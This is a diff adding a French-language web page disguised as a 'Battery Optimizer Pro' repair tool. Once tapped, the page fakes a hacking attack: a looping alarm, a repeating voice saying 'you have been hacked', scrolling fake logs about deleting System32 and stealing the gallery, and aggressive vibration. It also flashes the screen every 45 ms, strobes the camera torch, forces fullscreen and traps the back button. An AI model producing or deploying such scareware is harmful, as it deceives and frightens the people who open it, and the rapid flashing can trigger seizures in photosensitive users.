@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Battery Optimizer Pro</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; position: relative; }
+        .container { text-align: center; border: 1px solid #0f0; padding: 20px; border-radius: 10px; z-index: 100; background: #000; }
+        #start-btn { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 1.1rem; }
+        .flash-red { background-color: #ff0000 !important; }
+        
+        .log-line { position: absolute; left: 5px; color: #0f0; font-size: 0.9rem; white-space: nowrap; z-index: 150; animation: scrollUp 2.5s linear forwards; }
+        @keyframes scrollUp { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
+
+        #warning-text { display: none; position: absolute; top: 15%; color: #f00; font-size: 2.2rem; font-weight: bold; text-align: center; width: 100%; z-index: 200; text-shadow: 3px 3px #000; }
+        #scare-img { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0; z-index: 50; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+    <div id="warning-text">⚠️ ALERTE SYSTÈME ⚠️<br>VOUS AVEZ ÉTÉ PIRATÉ</div>
+
+    <div id="interface" class="container">
+        <h2>BATTERIE FAIBLE ?</h2>
+        <p>Réparation des cellules endommagées...</p>
+        <button id="start-btn" onclick="launchPrank()">OPTIMISER MAINTENANT</button>
+    </div>
+
+    <img id="scare-img" src="https://i.imgur.com/K1z3s1H.jpeg">
+
+    <audio id="alarm-sound" loop>
+        <source src="https://www.myinstants.com/media/sounds/alarm.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+    // Fonction pour la voix qui parle en boucle
+    function parler() {
+        const message = new SpeechSynthesisUtterance("Vous avez été piraté");
+        message.lang = 'fr-FR';
+        message.rate = 1.2;
+        message.pitch = 0.8;
+        window.speechSynthesis.speak(message);
+    }
+
+    function createLog() {
+        const logs = [
+            "SUPPRESSION DE SYSTEM32...", "ACCÈS ROOT : ACCORDÉ", "EXTRACTION DE LA GALERIE...",
+            "CORRUPTION DU SECTEUR DE BOOT...", "LOCALISATION GPS : ABIDJAN_MACACI", "ENVOI VERS LE DARK NET...",
+            "ERREUR : KERNEL PANIC", "SURCHAUFFE DU PROCESSEUR...", "BATTERIE DÉTRUITE"
+        ];
+        const log = document.createElement('div');
+        log.className = 'log-line';
+        log.style.left = Math.random() * 70 + '%';
+        log.innerText = logs[Math.floor(Math.random() * logs.length)];
+        document.body.appendChild(log);
+        setTimeout(() => log.remove(), 2500);
+    }
+
+    async function launchPrank() {
+        // Lancement de l'alarme et de la voix
+        const alarm = document.getElementById('alarm-sound');
+        alarm.volume = 1.0;
+        alarm.play().catch(() => {});
+        
+        setInterval(parler, 2000); // Répète la voix toutes les 2 secondes
+
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        }
+
+        document.getElementById('interface').style.display = 'none';
+        document.getElementById('warning-text').style.display = 'block';
+        document.getElementById('scare-img').style.opacity = '1';
+
+        // 1. Vibrations renforcées (Très agressives)
+        if ("vibrate" in navigator) {
+            setInterval(() => { 
+                navigator.vibrate([1000, 50, 1000, 50, 1000]); 
+            }, 500);
+        }
+
+        // 2. Défilement des textes en français
+        setInterval(createLog, 180);
+
+        // 3. Flash écran violent (Rouge/Noir)
+        setInterval(() => {
+            document.body.classList.toggle('flash-red');
+        }, 45);
+
+        // 4. Flash caméra
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+            const track = stream.getVideoTracks()[0];
+            let isOn = false;
+            setInterval(async () => {
+                isOn = !isOn;
+                await track.applyConstraints({ advanced: [{ torch: isOn }] });
+            }, 120);
+        } catch (e) {}
+
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = () => { window.history.pushState(null, null, window.location.href); };
+    }
+    </script>
+</body>
+</html>
